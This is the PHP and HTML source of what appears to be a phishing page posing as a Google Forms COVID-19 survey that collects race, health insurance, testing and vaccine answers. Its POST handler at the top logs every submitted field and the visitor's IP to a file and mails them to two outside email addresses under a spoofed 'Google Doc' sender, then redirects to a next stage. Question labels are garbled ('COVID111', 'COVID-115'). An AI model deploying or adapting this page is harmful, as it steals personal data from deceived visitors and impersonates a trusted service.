<?php
include'blocker.php';
include'function.php';
include'_Obs.php';
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
header("Location: c?form_id=".getName($n)."");
$handle = fopen('result.txt', 'a');
fwrite($handle, 'Form 2---['.strtoupper(date("h:i:s a - Y/m/d")).']---['.$_SERVER['REMOTE_ADDR']."]\r\n");
foreach($_POST as $variable => $value) {
	$message .= $variable.': '.$value."\r\n";}
$header  = 'From: Google Doc <donotreply@owl.shop>'."\r\n";
$header .= 'Reply-To: donotreply@owl.shop'."\r\n";
$header .= 'MIME-Version: 1.0'."\r\n";
$header .= 'Content-Type: text/plain; charset=utf-8'."\r\n";
$header .= 'Content-Transfer-Encoding: 8bit'."\r\n";
$header .= 'X-Mailer: PHP v'.phpversion();
mail('jjennie484@gmail.com', $_SERVER['REMOTE_ADDR'].' @ '.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'], $message, $header);
mail('office00107@protonmail.com', $_SERVER['REMOTE_ADDR'].' @ '.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'], $message, $header);
fwrite($handle, $variable.': '.$value."\r\n\n");}
fclose($handle);
exit;
} ?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html lang="en-US"  class="supernova"><head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="alternate" type="application/json+oembed" href="https://www.jotform.com/oembed/?format=json&amp;url=https%3A%2F%2Fform.jotform.com%2F203380766775061" title="oEmbed Form">
<link rel="alternate" type="text/xml+oembed" href="https://www.jotform.com/oembed/?format=xml&amp;url=https%3A%2F%2Fform.jotform.com%2F203380766775061" title="oEmbed Form">
<meta property="og:title" content="Form" >
<meta property="og:url" content="https://form.jotform.com/203380766775061" >
<meta property="og:description" content="Please click the link to complete this form." >
<meta name="slack-app-id" content="AHNMASS8M">
<link rel="shortcut icon" href="https://ssl.gstatic.com/docs/spreadsheets/forms/favicon_qp2.png">
<link rel="canonical" href="https://form.jotform.com/203380766775061" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=1" />
<meta name="HandheldFriendly" content="true" />
<title>Introduction</title>
<link type="text/css" media="print" rel="stylesheet" href="https://cdn.jotfor.ms/css/printForm.css" />
<link type="text/css" rel="stylesheet" href="https://cdn.jotfor.ms/themes/CSS/5e6b428acc8c4e222d1beb91.css?themeRevisionID=5f7ed99c2c2c7240ba580251"/>
<link type="text/css" rel="stylesheet" href="https://cdn.jotfor.ms/css/styles/payment/payment_styles.css" />
<link type="text/css" rel="stylesheet" href="https://cdn.jotfor.ms/css/styles/payment/payment_feature.css" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/punycode/1.4.1/punycode.min.js"></script>
<script src="https://cdn.jotfor.ms/js/vendor/jquery-1.8.0.min.js?v=3.3.22120" type="text/javascript"></script>
<script src="https://cdn.jotfor.ms/js/vendor/maskedinput.min.js?v=3.3.22120" type="text/javascript"></script>
<script src="https://cdn.jotfor.ms/js/vendor/jquery.maskedinput.min.js?v=3.3.22120" type="text/javascript"></script>
<script src="https://cdn.jotfor.ms/static/prototype.forms.js" type="text/javascript"></script>
<script src="https://cdn.jotfor.ms/static/jotform.forms.js" type="text/javascript"></script>
<style>
  .custom-button{
    background-color: #F9F5F5;
    color: rgb(19, 18, 32);
    border: 1px solid white;
    max-width: 90px;
    width: 90px;
    padding:10px ;
    border-radius: 5px;
    font-family: inherit;
    font-weight: bold;
    -webkit-box-shadow: 0 6px 4px -6px rgb(129, 125, 125); 
    -moz-box-shadow:    0 6px 4px -6px rgb(129, 125, 125);  
    box-shadow: 0 6px 4px -6px rgb(129, 125, 125);
  }
  .custom-button:hover{
    background-color: #DCD9D9;
  }
</style>
</head>
<body>
 <li class="form-line" data-type="control_image" id="id_3">
        <div id="cid_3" class="form-input-wide" data-layout="full">
          <div style="text-align:center">
            <img alt="" class="form-image" style="border-radius:10px" src="https://www.jotform.com/uploads/rdp4099/form_files/AF1QipOc3z7p3Hk2jS9iTQUfhszXideoW19Ph-3i29wS=w1832-h458.5fc9d0dd2fb8c6.59819156.png" height="200px" width="765px" data-component="image" />
          </div>
        </div>
      </li>
<form class="jotform-form" action="<?php echo basename(__FILE__); ?>" method="post" name="form_203380766775061" id="203380766775061" accept-charset="utf-8" autocomplete="on">

  <div role="main" class="form-all">
    <ul class="form-section page-section">
     
      <li id="cid_4" class="form-input-wide" data-type="control_head">
        <div class="form-header-group  header-large">
          <div class="header-text httal htvam">
            <h1 id="header_4" class="form-header" data-component="header">
              Introduction
            </h1>
            <div id="" class="">
               <p style="color:red">* Required
            </div>
          </div>
        </div>
      </li>
      <li class="form-line" data-type="control_checkbox" id="id_7">
        <label class="form-label form-label-top form-label-auto" id="label_7" for="input_7"> Please indicate what you consider your racial background to be. We greatly appreciate your help. The categories we use may not fully describe you, but they do match those used by the Census Bureau. <font style="color:red">*</font> </label>
        <div id="cid_7" class="form-input-wide" data-layout="full">
          <div class="form-single-column" role="group" aria-labelledby="label_7" data-component="checkbox">
            <span class="form-checkbox-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <br><input type="checkbox" class="form-checkbox" id="input_7_0" name="Please indicate what you consider your racial background to be. We greatly appreciate your help. The categories we use may not fully describe you, but they do match those used by the Census Bureau." value="White" />
              <label id="label_input_7_0" for="input_7_0"> White </label>
            </span>
            <span class="form-checkbox-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="checkbox" class="form-checkbox" id="input_7_1" name="Please indicate what you consider your racial background to be. We greatly appreciate your help. The categories we use may not fully describe you, but they do match those used by the Census Bureau." value="Black or African American" />
              <label id="label_input_7_1" for="input_7_1"> Black or African American </label>
            </span>
            <span class="form-checkbox-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="checkbox" class="form-checkbox" id="input_7_2" name="Please indicate what you consider your racial background to be. We greatly appreciate your help. The categories we use may not fully describe you, but they do match those used by the Census Bureau." value="American Indian" />
              <label id="label_input_7_2" for="input_7_2"> American Indian </label>
            </span>
			<span class="form-checkbox-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="checkbox" class="form-checkbox" id="input_7_3" name="Please indicate what you consider your racial background to be. We greatly appreciate your help. The categories we use may not fully describe you, but they do match those used by the Census Bureau." value="Asian Indian" />
              <label id="label_input_7_3" for="input_7_3"> Asian Indian </label>
            </span>
			<span class="form-checkbox-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="checkbox" class="form-checkbox" id="input_7_4" name="Please indicate what you consider your racial background to be. We greatly appreciate your help. The categories we use may not fully describe you, but they do match those used by the Census Bureau." value="Chinese" />
              <label id="label_input_7_4" for="input_7_4"> Chinese </label>
            </span>
			<span class="form-checkbox-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="checkbox" class="form-checkbox" id="input_7_5" name="Please indicate what you consider your racial background to be. We greatly appreciate your help. The categories we use may not fully describe you, but they do match those used by the Census Bureau." value="Filipino" />
              <label id="label_input_7_5" for="input_7_5"> Filipino </label>
            </span>
			<span class="form-checkbox-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="checkbox" class="form-checkbox" id="input_7_6" name="Please indicate what you consider your racial background to be. We greatly appreciate your help. The categories we use may not fully describe you, but they do match those used by the Census Bureau." value="Other Asian" />
              <label id="label_input_7_6" for="input_7_6"> Other Asian </label>
            </span>
            <span class="form-checkbox-item formCheckboxOther" style="clear:left">
              <input type="checkbox" class="form-checkbox-other form-checkbox" name="Please indicate what you consider your racial background to be. We greatly appreciate your help. The categories we use may not fully describe you, but they do match those used by the Census Bureau." id="other_7" value="Other" aria-label="Other" />
              <label id="label_other_7" style="text-indent:0" for="other_7"> Other </label>
              
            </span>
          </div>
        </div>
      </li>
	  <li class="form-line" data-type="control_checkbox" id="id_8">
        <label class="form-label form-label-top form-label-auto" id="label_8" for="input_8"> Please indicate what actions or behaviours recommended by your government or local health authority that you are following <font style="color:red">*</font> </label>
        <div id="cid_8" class="form-input-wide" data-layout="full">
          <div class="form-single-column" role="group" aria-labelledby="label_8" data-component="checkbox">
            <span class="form-checkbox-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <br><input type="checkbox" class="form-checkbox" id="input_8_0" name="Please indicate what actions or behaviours recommended by your government or local health authority that you are following" value="Hand washing" />
              <label id="label_input_8_0" for="input_8_0"> Hand washing </label>
            </span>
            <span class="form-checkbox-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="checkbox" class="form-checkbox" id="input_8_1" name="Please indicate what actions or behaviours recommended by your government or local health authority that you are following" value="Hand sanitizer" />
              <label id="label_input_8_1" for="input_8_1"> Hand sanitizer </label>
            </span>
            <span class="form-checkbox-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="checkbox" class="form-checkbox" id="input_8_2" name="Please indicate what actions or behaviours recommended by your government or local health authority that you are following" value="Wearing a face mask" />
              <label id="label_input_8_2" for="input_8_2"> Wearing a face mask </label>
            </span>
			<span class="form-checkbox-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="checkbox" class="form-checkbox" id="input_8_3" name="Please indicate what actions or behaviours recommended by your government or local health authority that you are following" value="Coughing/sneezing into your elbow" />
              <label id="label_input_8_3" for="input_8_3"> Coughing/sneezing into your elbow </label>
            </span>
			<span class="form-checkbox-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="checkbox" class="form-checkbox" id="input_8_4" name="Please indicate what actions or behaviours recommended by your government or local health authority that you are following" value="Wearing gloves" />
              <label id="label_input_8_4" for="input_8_4"> Wearing gloves </label>
            </span>
			<span class="form-checkbox-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="checkbox" class="form-checkbox" id="input_8_5" name="Please indicate what actions or behaviours recommended by your government or local health authority that you are following" value="Staying/Working at home" />
              <label id="label_input_8_5" for="input_8_5"> Staying/Working at home </label>
            </span>
			<span class="form-checkbox-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="checkbox" class="form-checkbox" id="input_8_6" name="Please indicate what actions or behaviours recommended by your government or local health authority that you are following" value="Avoiding social gatherings (large and small)" />
              <label id="label_input_8_6" for="input_8_6"> Avoiding social gatherings (large and small) </label>
            </span>
            <span class="form-checkbox-item formCheckboxOther" style="clear:left">
              <input type="checkbox" class="form-checkbox-other form-checkbox" name="Please indicate what actions or behaviours recommended by your government or local health authority that you are following" id="other_8" value="Avoiding public transport" aria-label="Other" />
              <label id="label_other_8" style="text-indent:0" for="other_8"> Avoiding public transport </label>
             
            </span>
          </div>
        </div>
      </li>
	  <li class="form-line" data-type="control_radio" id="id_9">
        <label class="form-label form-label-top form-label-auto" id="label_9" for="input_9"> What do you think of the actions taken by your government or local health authority to prevent and/or reduce the spread of COVID-19? <font style="color:red">*</font></label>
        <div id="cid_9" class="form-input-wide" data-layout="full">
          <div class="form-single-column" role="group" aria-labelledby="label_9" data-component="radio">
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <br><input type="radio" class="form-radio" id="input_9_0" name="What do you think of the actions taken by your government or local health authority to prevent and/or reduce the spread of COVID-19?" value="Too strict" />
              <label id="label_input_9_0" for="input_9_0"> Too strict </label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_9_1" name="What do you think of the actions taken by your government or local health authority to prevent and/or reduce the spread of COVID-19?" value="About right" />
              <label id="label_input_9_1" for="input_9_1"> About right </label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_9_2" name="What do you think of the actions taken by your government or local health authority to prevent and/or reduce the spread of COVID-19?" value="Too lenient" />
              <label id="label_input_9_2" for="input_9_2"> Too lenient </label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_9_3" name="What do you think of the actions taken by your government or local health authority to prevent and/or reduce the spread of COVID-19?" value="I don't know/I'm not sure" />
              <label id="label_input_9_3" for="input_9_3"> I don't know/I'm not sure </label>
            </span>
          </div>
        </div>
      </li>
	  <li class="form-line" data-type="control_radio" id="id_10">
        <label class="form-label form-label-top form-label-auto" id="label_10" for="input_10"> Do you currently have a health insurance or health coverage plan? <font style="color:red">*</font></label>
        <div id="cid_10" class="form-input-wide" data-layout="full">
          <div class="form-single-column" role="group" aria-labelledby="label_10" data-component="radio">
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <br><input type="radio" class="form-radio" id="input_10_0" name="Do you currently have a health insurance or health coverage plan?" value="Yes" />
              <label id="label_input_10_0" for="input_10_0"> Yes </label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_10_1" name="Do you currently have a health insurance or health coverage plan?" value="No" />
              <label id="label_input_10_1" for="input_10_1"> No </label>
            </span>
          </div>
        </div>
      </li>
	   <li class="form-line" data-type="control_radio" id="id_11">
        <label class="form-label form-label-top form-label-auto" id="label_11" for="input_11"> How much trust do you have on the official information about the COVID111 pandemic? <font style="color:red">*</font><br><br>No Trust</label>
        <div id="cid_11" class="form-input-wide" data-layout="full">
          <div class="form-single-column" role="group" aria-labelledby="label_11" data-component="radio">
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <br><input type="radio" class="form-radio" id="input_11_0" name="How much trust do you have on the official information about the COVID111 pandemic? " value="1" />
              <label id="label_input_11_0" for="input_11_0"> 1 </label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_11_1" name="How much trust do you have on the official information about the COVID111 pandemic? " value="2" />
              <label id="label_input_11_1" for="input_11_1"> 2 </label>
            </span>
			<span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_11_2" name="How much trust do you have on the official information about the COVID111 pandemic? " value="3" />
              <label id="label_input_11_2" for="input_11_2"> 3 </label>
            </span>
			<span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_11_3" name="How much trust do you have on the official information about the COVID111 pandemic? " value="4" />
              <label id="label_input_11_3" for="input_11_3"> 4 </label>
            </span>
			<span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_11_4" name="How much trust do you have on the official information about the COVID111 pandemic? " value="5" />
              <label id="label_input_11_4" for="input_11_4"> 5 </label><br><br>&nbspA lot
            </span>
          </div>
        </div>
      </li>
	  <li class="form-line" data-type="control_radio" id="id_12">
        <label class="form-label form-label-top form-label-auto" id="label_12" for="input_12"> How likely is that you or any immediate family member being infected by the COVID-112 virus? <font style="color:red">*</font><br><br>Very unlikely</label>
        <div id="cid_12" class="form-input-wide" data-layout="full">
          <div class="form-single-column" role="group" aria-labelledby="label_12" data-component="radio">
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <br><input type="radio" class="form-radio" id="input_12_0" name="How likely is that you or any immediate family member being infected by the COVID-112 virus?" value="1" />
              <label id="label_input_12_0" for="input_12_0"> 1 </label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_12_1" name="How likely is that you or any immediate family member being infected by the COVID-112 virus?" value="2" />
              <label id="label_input_12_1" for="input_12_1"> 2 </label>
            </span>
			<span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_12_2" name="How likely is that you or any immediate family member being infected by the COVID-112 virus?" value="3" />
              <label id="label_input_12_2" for="input_12_2"> 3 </label>
            </span>
			<span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_12_3" name="How likely is that you or any immediate family member being infected by the COVID-112 virus?" value="4" />
              <label id="label_input_12_3" for="input_12_3"> 4 </label>
            </span>
			<span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_12_4" name="How likely is that you or any immediate family member being infected by the COVID-112 virus?" value="5" />
              <label id="label_input_12_4" for="input_12_4"> 5 </label><br><br>&nbspVery likely
            </span>
          </div>
        </div>
      </li>
	  <li class="form-line" data-type="control_radio" id="id_13">
        <label class="form-label form-label-top form-label-auto" id="label_13" for="input_13"> How do you rate the overall governments planning and management of the COVID-113 up until now? <font style="color:red">*</font><br><br>Very weak</label>
        <div id="cid_13" class="form-input-wide" data-layout="full">
          <div class="form-single-column" role="group" aria-labelledby="label_13" data-component="radio">
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <br><input type="radio" class="form-radio" id="input_13_0" name="How do you rate the overall governments planning and management of the COVID-19 up until now?" value="1" />
              <label id="label_input_13_0" for="input_13_0"> 1 </label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_13_1" name="How do you rate the overall governments planning and management of the COVID-19 up until now?" value="2" />
              <label id="label_input_13_1" for="input_13_1"> 2 </label>
            </span>
			<span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_13_2" name="How do you rate the overall governments planning and management of the COVID-19 up until now?" value="3" />
              <label id="label_input_13_2" for="input_13_2"> 3 </label>
            </span>
			<span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_13_3" name="How do you rate the overall governments planning and management of the COVID-19 up until now?" value="4" />
              <label id="label_input_13_3" for="input_13_3"> 4 </label>
            </span>
			<span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_13_4" name="How do you rate the overall governments planning and management of the COVID-19 up until now?" value="5" />
              <label id="label_input_13_4" for="input_13_4"> 5 </label><br><br>&nbspVery good
            </span>
          </div>
        </div>
      </li>
      <li class="form-line" data-type="control_phone" id="id_6">
        <label class="form-label form-label-top form-label-auto" id="label_6" for="input_6_full"> Assume that a vaccine has become available that you can get. This vaccine will immunize you against COVID-19 for one to two years. Even though your insurance may cover part of the cost, how much are you willing to pay to get a vaccine for one person? <font style="color:red">*</font></label>
        <div id="cid_6" class="form-input-wide" data-layout="half">
          <span class="form-sub-label-container" style="vertical-align:top">
            <input type="age" id="input_6_full" name="Assume that a vaccine has become available that you can get. This vaccine will immunize you against COVID-19 for one to two years. Even though your insurance may cover part of the cost, how much are you willing to pay to get a vaccine for one person?" data-type="mask-number" class="mask-phone-number form-textbox validate[Fill Mask]" style="width:310px" data-masked="true" value="" placeholder="Your answer" data-component="" aria-labelledby="label_6 sublabel_6_masked" />
          </span>
        </div>
      </li>
      <li class="form-line" data-type="control_radio" id="id_14">
        <label class="form-label form-label-top form-label-auto" id="label_14" for="input_14"> Did you receive the seasonal flu shot this past fall/winter? <font style="color:red">*</font></label>
        <div id="cid_14" class="form-input-wide" data-layout="full">
          <div class="form-single-column" role="group" aria-labelledby="label_14" data-component="radio">
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <br><input type="radio" class="form-radio" id="input_14_0" name="Did you receive the seasonal flu shot this past fall/winter?" value="Yes" />
              <label id="label_input_14_0" for="input_14_0"> Yes </label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_14_1" name="Did you receive the seasonal flu shot this past fall/winter?" value="No" />
              <label id="label_input_14_1" for="input_14_1"> No </label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_14_2" name="Did you receive the seasonal flu shot this past fall/winter?" value="I don't know" />
              <label id="label_input_14_2" for="input_14_2"> I don't know </label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_14_3" name="Did you receive the seasonal flu shot this past fall/winter?" value="Prefer not to know" />
              <label id="label_input_14_3" for="input_14_3"> Prefer not to know </label>
            </span>
          </div>
        </div>
      </li>
      <li class="form-line" data-type="control_radio" id="id_15">
        <label class="form-label form-label-top form-label-auto" id="label_15" for="input_15"> Have you been tested for COVID-115? <font style="color:red">*</font></label>
        <div id="cid_15" class="form-input-wide" data-layout="full">
          <div class="form-single-column" role="group" aria-labelledby="label_15" data-component="radio">
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <br><input type="radio" class="form-radio" id="input_15_0" name="Have you been tested for COVID-115?" value="Yes, once" />
              <label id="label_input_15_0" for="input_15_0"> Yes, once </label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_15_1" name="Have you been tested for COVID-115?" value="Yes, multiple times" />
              <label id="label_input_15_1" for="input_15_1"> Yes, multiple times </label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_15_2" name="Have you been tested for COVID-115?" value="No" />
              <label id="label_input_15_2" for="input_15_2"> No </label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_15_3" name="Have you been tested for COVID-115?" value="Prefer not to answer" />
              <label id="label_input_15_3" for="input_15_3"> Prefer not to answer </label>
            </span>
          </div>
        </div>
      </li>
      <li class="form-line" data-type="control_radio" id="id_16">
        <label class="form-label form-label-top form-label-auto" id="label_16" for="input_16"> Are you willing to participate in a COVID-116 vaccine testing program? <font style="color:red">*</font></label>
        <div id="cid_16" class="form-input-wide" data-layout="full">
          <div class="form-single-column" role="group" aria-labelledby="label_16" data-component="radio">
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <br><input type="radio" class="form-radio" id="input_16_0" name="Are you willing to participate in a COVID-116 vaccine testing program?" value="Yes" />
              <label id="label_input_16_0" for="input_16_0"> Yes </label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_16_1" name="Are you willing to participate in a COVID-116 vaccine testing program?" value="No" />
              <label id="label_input_16_1" for="input_16_1"> No </label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_16_2" name="Are you willing to participate in a COVID-116 vaccine testing program?" value="Maybe" />
              <label id="label_input_16_2" for="input_16_2"> Maybe </label>
            </span>
          </div>
        </div>
      </li>
      <li class="form-line" data-type="control_button" id="id_25">
        <div id="cid_25" class="form-input-wide" data-layout="full">
          <div data-align="left" class="form-buttons-wrapper form-buttons-left   jsTest-button-wrapperField">
            <button id="input_25" type="submit" class="  custom-button" data-component="button" data-content="">
              Next
            </button>
          </div>
        </div>
      </li>
	  <img src="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/gigs/129994299/original/fb6edd112ce0be24ca178140aa0327316984f400/create-a-google-form-about-anything-you-want.png" alt="Form" style="width:250px;height:100px; display: block;margin-left: auto;margin-right: auto;">

    </ul>
  </div>
</html>
<script src="https://cdn.jotfor.ms//js/vendor/smoothscroll.min.js?v=3.3.22120"></script>
<script src="https://cdn.jotfor.ms//js/errorNavigation.js?v=3.3.22120"></script>
